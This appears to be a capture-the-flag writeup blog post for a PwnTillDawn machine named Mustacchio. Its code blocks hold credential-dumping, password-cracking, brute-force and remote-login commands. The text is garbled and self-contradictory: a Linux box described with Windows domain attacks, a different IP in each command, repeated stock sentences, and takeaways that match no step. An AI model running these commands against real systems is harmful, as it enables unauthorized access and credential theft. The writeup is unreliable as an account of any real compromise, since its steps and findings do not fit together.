---
TitleSEO: "PwnTillDawn — Mustacchio (Easy Linux) | ZureFX"
TitlePost: "PwnTillDawn — Mustacchio (Easy Linux)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Mustacchio. SQL Injection and AlwaysInstallElevated to achieve easy compromise on Linux."
Keywords: "pwntilldawn, medium, linux"
URL: "https://zurefx.github.io/writeups/htb-mustacchio-361.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-mustacchio-361/"
Date: "2026-02-23"
Tags: "PwnTillDawn, Medium, Linux"
Section: "writeups"
Lang: "en"
main_img: "htb-mustacchio-361"
Permalink: "/writeups/htb-mustacchio-361.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Mustacchio** is rated **Easy** on PwnTillDawn. It runs **Linux** and the IP address during this analysis was `10.106.1.168`.

### Objectives

Weak file permissions allowed modification of critical system files. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
gobuster dir -u http://10.121.27.108/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.13.237.153/FUZZ
feroxbuster -h
```

Lateral movement was facilitated by reusing discovered credentials across services. Privilege escalation was possible due to misconfigured sudo permissions.

### Service Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. The database credentials were hardcoded in the application source code. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.85.24.42
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.98.44.234/FUZZ
```

The target system was identified as running a vulnerable version of the service. The application stored sensitive credentials in an unencrypted configuration file.

### SMB Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
crackmapexec smb 10.127.145.102 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.33.24.192 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.35.227.56 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The service account had excessive permissions assigned in Active Directory. The scheduled task ran with elevated privileges and could be abused for escalation.

## Exploitation

### Vulnerability Identification

The database credentials were hardcoded in the application source code. The backup files contained sensitive information that should not have been accessible. Group Policy Preferences contained encrypted but recoverable credentials.

Key finding: **Golden Ticket**.

Post-exploitation enumeration revealed a path to domain administrator privileges. Network traffic analysis revealed unencrypted communications containing user credentials.

### Initial Access

The backup files contained sensitive information that should not have been accessible. Command injection was possible through unsanitized user input in the search functionality.

```bash
nmap -sCV -p110,445,110 10.69.80.170 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.127.81.9
```

The backup files contained sensitive information that should not have been accessible. Command injection was possible through unsanitized user input in the search functionality. The application stored sensitive credentials in an unencrypted configuration file.

## Privilege Escalation

### Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. The kernel version was outdated and vulnerable to a publicly known exploit. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
gobuster dir -u http://10.56.138.120/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.99.106.90/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.105.174.199 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

Network traffic analysis revealed unencrypted communications containing user credentials. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.64.145.27
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
```

The application stored sensitive credentials in an unencrypted configuration file. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Root/SYSTEM

Successfully obtained **root** access on the target.

The web application was vulnerable to Server-Side Template Injection (SSTI). The service was running without proper input validation, leading to injection vulnerabilities.

## Summary

### Tools Used

- `ffuf`
- `smbclient`
- `netcat`
- `atexec`

### Key Takeaways

- SQL Injection
- AlwaysInstallElevated
- DLL Hijacking
- Golden Ticket
